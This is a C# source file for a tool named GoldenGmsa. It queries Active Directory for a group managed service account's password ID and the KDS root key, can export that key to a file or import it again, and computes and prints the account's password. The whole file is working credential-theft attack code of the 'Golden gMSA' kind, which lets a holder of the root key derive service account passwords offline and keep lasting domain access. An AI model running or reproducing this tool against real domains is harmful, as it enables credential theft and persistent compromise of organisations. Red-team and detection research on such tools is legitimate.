using System;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Security.Principal;

namespace GoldengMSA
{
    public class Program
    {                       

        public static byte[] QueryManagedPasswordID(string SIDString)
        {
            string domain = Utils.domain;
            string[] attributes = { "msds-ManagedPasswordID" };
            string filter = String.Format("(objectSID={0})", SIDString);
            DirectoryEntry entry = new DirectoryEntry(String.Format("LDAP://{0}", domain));
            DirectorySearcher dSearch = new DirectorySearcher(entry, filter, attributes);
            SearchResult result = dSearch.FindOne();
            if (result == null)
            {
                throw new Exception("Could not find SID " + SIDString);
            }
            return (byte[])result.Properties["msds-ManagedPasswordID"][0];
        }

        public static SearchResult QueryRootKey(string SIDString)
        {
            string domain = Utils.domain;
            Msds_ManagedPasswordID msds_ManagedPasswordID = new Msds_ManagedPasswordID(QueryManagedPasswordID(SIDString));
            string rootKey = msds_ManagedPasswordID.RootKeyIdentifier.ToString();

            string[] attributes = { "msKds-SecretAgreementParam", "msKds-RootKeyData", "msKds-KDFParam", "msKds-KDFAlgorithmID", "msKds-CreateTime", "msKds-UseStartTime",
                "msKds-Version", "msKds-DomainID", "cn", "msKds-PrivateKeyLength", "msKds-PublicKeyLength", "msKds-SecretAgreementAlgorithmID" };

            string dn = Utils.GetDN();

            string filter = String.Format("(&(objectClass=msKds-ProvRootKey)(cn={0}))", rootKey);
            DirectoryEntry entry = new DirectoryEntry(String.Format("LDAP://{0}/CN=Configuration,{1}", domain, dn));
            DirectorySearcher dSearch = new DirectorySearcher(entry, filter, attributes);
            SearchResult result = dSearch.FindOne();
            if (result == null)
            {
                throw new Exception("Could not find KDS Root Key with guid of " + rootKey);
            }
            return result;
        }

        public static void ExportRootKey(string SIDString, string path)
        {
            string domain = Utils.domain;
            SearchResult result = QueryRootKey(SIDString);
            Root_Key.Export(result, path);
        }

        public static Root_Key ImportRootKey(string path)
        {
            return new Root_Key(path);
        }

        public static string GetGmsaPassword(string SIDString, Root_Key RootKey, byte[] Msds_ManagedPasswordID)
        {
            int l0KeyID = 0, l1KeyID = 0, l2KeyID = 0;
            Utils.GetCurrentIntervalID(Utils.GetKdsKeyCycleDuration(), 0, ref l0KeyID, ref l1KeyID, ref l2KeyID);

            byte[] gMSASD = { 0x1, 0x0, 0x4, 0x80, 0x30, 0x0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x02, 0x0, 0x1C, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x14, 0x0, 0x9F, 0x1, 0x12, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0x9, 0x0, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0x12, 0x0, 0x0, 0x0 };
            GetKey.GROUP_KEY_ENVELOPE gke;
            int gkeSize;

            GetKey.GetSIDKeyLocal(gMSASD, gMSASD.Length, RootKey, l0KeyID, l1KeyID, l2KeyID, 0, out gke, out gkeSize);

            int passwordBlobSize = 256;
            byte[] passwordBlob = new byte[passwordBlobSize];
            var sid = new SecurityIdentifier(SIDString);
            byte[] sidBytes = new byte[sid.BinaryLength];
            sid.GetBinaryForm(sidBytes, 0);

            GmsaPassword.GenerateGMSAPassowrd(gke, gkeSize, Msds_ManagedPasswordID, sidBytes, IntPtr.Zero, IntPtr.Zero, out passwordBlob, passwordBlobSize);
            return Convert.ToBase64String(passwordBlob);
        }

        public static void WriteGmsaPassword(string SIDString)
        {
            Root_Key rootKey = new Root_Key(QueryRootKey(SIDString));
            WriteGmsaPassword(SIDString, rootKey);
        }

        public static void WriteGmsaPassword(string SIDString, Root_Key RootKey)
        {
            string domain = Utils.domain;
            if (RootKey == null)
            {
                RootKey = new Root_Key(QueryRootKey(SIDString));
            }
            byte[] managedPasswordID = QueryManagedPasswordID(SIDString);
            Console.WriteLine(GetGmsaPassword(SIDString, RootKey, managedPasswordID));
        }

        static void Main(string[] args)
        {
            string usage = "Usage: GoldenGmsa.exe GmsaSID <--export-key PATH> <--import-key PATH>";
            if (args.Length == 0)
            {
                Console.WriteLine(usage);
                return;
            }
            string sidString = args[0];
            if (args.Length > 1)
            {
                string path = "KdsRootKey.sem";
                if (args.Length > 2)
                {
                    path = args[2];
                }
                switch (args[1].ToLower())
                {
                    case ("--export-key"):
                        ExportRootKey(sidString, path);
                        Console.WriteLine("Done.");
                        return;
                    case ("--import-key"):
                        WriteGmsaPassword(sidString, ImportRootKey(path));
                        return;
                    default:
                        Console.WriteLine(usage);
                        return;
                }
            }
            WriteGmsaPassword(sidString);
            return;
        }
    }
}